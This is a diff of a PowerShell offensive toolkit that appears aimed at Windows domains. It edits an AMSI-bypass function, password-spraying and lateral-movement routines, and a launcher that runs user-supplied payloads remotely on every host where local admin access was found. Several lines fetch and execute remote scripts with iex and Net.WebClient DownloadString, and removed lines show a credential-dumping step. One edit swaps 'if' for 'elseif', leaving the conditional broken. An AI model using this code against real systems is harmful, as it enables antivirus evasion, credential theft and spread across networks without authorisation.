@@ -10,11 +10,11 @@ function AmsiBypass
 {
     <#
         .DESCRIPTION
-        Amsi bypass by https://github.com/rasta-mouse/AmsiScanBufferBypass
+        Credit to Rastamouse
         License: BSD 3-Clause
     #>
-    #Privilege Escalation Phase
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1')
+    #
+    $string = iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsicustom.ps1')
 }
 
 function dependencychecks
@@ -1340,7 +1340,6 @@ function latmov
     #Lateral Movement Phase
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/masskittie.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
     $domain_Name = Get-NetDomain
@@ -1352,23 +1351,10 @@ function latmov
 
     fuller >> $currentPath\Exploitation\LocalAdminAccess.txt
 
-    $exploitdecision = Read-Host -Prompt 'Do you want to Dump Credentials on all found Systems or Execute Empire Stager? (dump/empire)'
-    if ($exploitdecision -eq "dump" -or $exploitdecision -eq "kittie" -or $exploitdecision -eq "Credentials")
+    $exploitdecision = Read-Host -Prompt 'Do you want to execite code remotely on all found Systems? (yes/no)'
+    elseif ($exploitdecision -eq "yes" -or $exploitdecision -eq "y")
     {
-        #Masskittie
-        $masskittie = Read-Host -Prompt 'Do you want to use Masskittie for all found Systems? (yes/no)'
-        if ($masskittie -eq "yes" -or $masskittie -eq "y" -or $masskittie -eq "Yes" -or $masskittie -eq "Y")
-        {
-           if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
-           {
-               bookmobile -sILeZZaOSNUwrt9 $currentPath\Exploitation\LocalAdminAccess.txt >> $currentPath\Exploitation\PwnedSystems_Credentials.txt
-           }
-           else { Write-Host -ForegroundColor Red 'No Systems with admin-Privileges found in this domain' }
-        }
-    }
-    elseif ($exploitdecision -eq "empire" -or $exploitdecision -eq "RAT")
-    {
-        empirelauncher
+        launcher
     }
 }
 
@@ -1399,7 +1385,7 @@ function domainpassspray
 	}
 }
 
-function empirelauncher
+function launcher
 {
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
@@ -1410,7 +1396,7 @@ function empirelauncher
     }
     else
     {
-        $file = "$currentPath\Exploitation\Exploited_Empire.txt"
+        $file = "$currentPath\Exploitation\Exploited.txt"
         While($i -ne "quit") 
         {
 	        If ($i -ne $NULL) 
@@ -1422,21 +1408,21 @@ function empirelauncher
 
     }
 
-    $stagerfile = "$currentPath\Exploitation\Empire_Stager.txt"
+    $stagerfile = "$currentPath\Exploitation\Stager.txt"
     While($Payload -ne "quit") 
     {
 	    If ($Payload -ne $NULL) 
         {
 	        $Payload.Trim() | Out-File $stagerfile -append
 	    }
-        $Payload = Read-Host -Prompt 'Please provide the powershell Empire Stager payload (beginning with "powershell -noP -sta -w 1 -enc  BASE64Code") :'
+        $Payload = Read-Host -Prompt 'Please provide the code to execute :'
     }
     
     $executionwith = Read-Host -Prompt 'Use the current User for Payload Execution? (yes/no):'
 
-    if (Test-Path $currentPath\Exploitation\Exploited_Empire.txt)
+    if (Test-Path $currentPath\Exploitation\Exploited.txt)
     {
-        $Hosts = Get-Content "$currentPath\Exploitation\Exploited_Empire.txt"
+        $Hosts = Get-Content "$currentPath\Exploitation\Exploited.txt"
     }
     else {$Hosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"}
 
